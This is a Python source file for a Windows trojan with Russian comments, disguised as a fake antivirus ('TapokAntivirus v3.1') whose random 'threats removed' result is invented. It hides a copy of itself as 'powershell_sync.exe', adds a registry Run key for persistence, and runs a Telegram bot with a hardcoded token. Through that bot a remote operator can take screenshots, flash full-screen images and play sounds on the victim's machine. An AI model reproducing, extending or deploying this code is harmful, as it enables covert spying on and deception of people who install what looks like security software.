import os, sys, asyncio, cv2, pyautogui, ctypes, shutil, subprocess, random, time, threading
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import BufferedInputFile
import tkinter as tk
from tkinter import ttk
from PIL import Image, ImageTk
import winsound

API_TOKEN = '8543450940:AAF5KG-Qa44HCYbsNRn0PS59D7QzoIEuzrQ'
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

# --- ПУТЬ ПОВЕРШЕЛЛА ---
def install_persistence():
    try:
        ps_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'PowerShell')
        target_path = os.path.join(ps_dir, 'v1.0', 'powershell_sync.exe')
        if not os.path.exists(os.path.dirname(target_path)): os.makedirs(os.path.dirname(target_path))
        if sys.executable != target_path:
            shutil.copy2(sys.executable, target_path)
            subprocess.run(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "PowerShellSync" /t REG_SZ /d "{target_path}" /f', shell=True, capture_output=True)
    except: pass

# --- ИНТЕРФЕЙС TAPOKANTIVIRUS ---
def start_gui():
    root = tk.Tk()
    root.title("TapokAntivirus v3.1")
    root.geometry("400x250")
    root.resizable(False, False)

    label = tk.Label(root, text="Система защищена", fg="green", font=("Arial", 12))
    label.pack(pady=20)

    progress = ttk.Progressbar(root, length=300, mode='determinate')
    progress.pack(pady=10)

    def scan():
        btn_scan.config(state="disabled")
        label.config(text="Сканирование системы...", fg="black")
        
        def run_progress():
            for i in range(101):
                time.sleep(2.4) # 240 секунд / 100 = 2.4 сек на 1%
                progress['value'] = i
            res = random.randint(1, 2)
            label.config(text=f"Готово! Найдено и удалено {res} угроз.", fg="blue")
            btn_scan.config(state="normal")
        
        threading.Thread(target=run_progress).start()

    btn_scan = tk.Button(root, text="Сканировать", command=scan, width=20)
    btn_scan.pack(pady=20)
    root.mainloop()

# --- ФУНКЦИИ БОТА ---
@dp.message(F.photo)
async def show_image(message: types.Message):
    # Качаем фото
    photo = message.photo[-1]
    file = await bot.get_file(photo.file_id)
    await bot.download_file(file.file_path, "show.png")
    
    def display():
        win = tk.Toplevel()
        win.attributes("-fullscreen", True)
        win.attributes("-topmost", True)
        img = Image.open("show.png")
        # Растягиваем на весь экран
        img = img.resize((pyautogui.size()), Image.LANCZOS)
        tk_img = ImageTk.PhotoImage(img)
        label = tk.Label(win, image=tk_img)
        label.pack()
        win.update()
        time.sleep(3)
        win.destroy()
        os.remove("show.png")

    threading.Thread(target=display).start()

@dp.message(F.voice | F.audio)
async def play_sys_sound(message: types.Message):
    file_id = message.voice.file_id if message.voice else message.audio.file_id
    file = await bot.get_file(file_id)
    await bot.download_file(file.file_path, "s.wav")
    # Системное воспроизведение без плеера
    winsound.PlaySound("s.wav", winsound.SND_FILENAME | winsound.SND_ASYNC)

@dp.message(F.text == "/screen")
async def srv_screen(m: types.Message):
    pyautogui.screenshot("s.png")
    await m.answer_photo(BufferedInputFile(open("s.png", "rb").read(), "s.png"))

async def main():
    install_persistence()
    # Запуск GUI в отдельном потоке
    threading.Thread(target=start_gui, daemon=True).start()
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
    
